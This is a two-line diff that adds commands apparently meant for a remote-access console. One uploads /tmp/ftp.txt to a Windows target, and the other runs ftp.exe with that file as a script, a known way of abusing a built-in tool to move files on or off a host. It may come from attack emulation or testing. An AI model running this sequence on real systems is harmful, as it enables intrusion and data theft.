@@ -1,0 +1,2 @@
+upload /tmp/ftp.txt
+shell C:\Windows\System32\ftp.exe -v -s:ftp.txt
